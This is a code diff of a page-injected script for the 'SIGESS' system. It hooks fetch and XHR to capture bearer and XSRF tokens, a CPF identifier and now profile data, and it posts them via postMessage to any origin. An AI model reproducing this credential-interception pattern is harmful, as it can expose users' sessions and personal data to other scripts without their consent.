@@ -10,9 +10,12 @@
   let lastSentHash = '';
   let lastSentTime = 0;
 
-  function checkAndSendTokens() {
+  function checkAndSendTokens(profile: { identificador: number; numeroFamiliar: number } | null) {
     if (capturedBearer && capturedXSRF && capturedCpf) {
-      const currentHash = `${capturedCpf}:${capturedBearer.slice(-10)}:${capturedXSRF.slice(-10)}`;
+      const profileHash = profile
+        ? `${profile.identificador}:${profile.numeroFamiliar}`
+        : 'not_found';
+      const currentHash = `${capturedCpf}:${capturedBearer.slice(-10)}:${capturedXSRF.slice(-10)}:${profileHash}`;
       const now = Date.now();
 
       // Só envia se os tokens mudaram ou se passou mais de 60 segundos
@@ -27,11 +30,36 @@
             bearer: capturedBearer,
             xsrf: capturedXSRF,
             cnas: capturedCnas || '1.36.02', // Versão padrão do Cnas
-            cpf: capturedCpf
+            cpf: capturedCpf,
+            profile,
+            profileNotFound: profile === null,
           }
         }, '*');
       }
     }
+  }
+
+  function readProfileOutcome(text: string): { identificador: number; numeroFamiliar: number } | null | undefined {
+    if (!text.trim()) return undefined;
+    try {
+      const data = JSON.parse(text);
+      if (!Array.isArray(data)) return undefined;
+      if (data.length === 0) return null;
+      const profile = data[0];
+      if (typeof profile?.identificador !== 'number' || typeof profile?.numeroFamiliar !== 'number') {
+        return undefined;
+      }
+      return {
+        identificador: profile.identificador,
+        numeroFamiliar: profile.numeroFamiliar,
+      };
+    } catch {
+      return undefined;
+    }
+  }
+
+  function isProfileRequest(url: string): boolean {
+    return url.toLowerCase().includes('/tipos-perfil');
   }
 
   function getHeader(headers: any, name: string): string | null {
@@ -81,13 +109,20 @@
             if (cpf) {
               capturedCpf = cpf;
               console.log("SIGESS: CPF capturado via Suporte API (Fetch): " + capturedCpf);
-              checkAndSendTokens();
             }
           });
         }
       }).catch(() => {});
-    } else if (capturedBearer && capturedXSRF && capturedCpf) {
-      checkAndSendTokens();
+    }
+
+    if (url && typeof url === 'string' && isProfileRequest(url)) {
+      resPromise.then(response => {
+        if (!response.ok) return;
+        response.clone().text().then(text => {
+          const outcome = readProfileOutcome(text);
+          if (outcome !== undefined) checkAndSendTokens(outcome);
+        }).catch(() => {});
+      }).catch(() => {});
     }
 
     return resPromise;
@@ -127,12 +162,13 @@
             const raw = xhr.responseText || (xhr.response ? xhr.response.toString() : '');
             const cpf = extractCpfFromText(raw);
             if (cpf) {
-                capturedCpf = cpf;
-                console.log("SIGESS: CPF capturado via Suporte API (XHR): " + capturedCpf);
-                checkAndSendTokens();
+              capturedCpf = cpf;
+              console.log("SIGESS: CPF capturado via Suporte API (XHR): " + capturedCpf);
             }
-        } else if (capturedBearer && capturedXSRF && capturedCpf) {
-            checkAndSendTokens();
+        }
+        if (isProfileRequest(urlStr) && xhr.status === 200) {
+          const outcome = readProfileOutcome(xhr.responseText || '');
+          if (outcome !== undefined) checkAndSendTokens(outcome);
         }
     });
     return (send as any).apply(this, arguments);
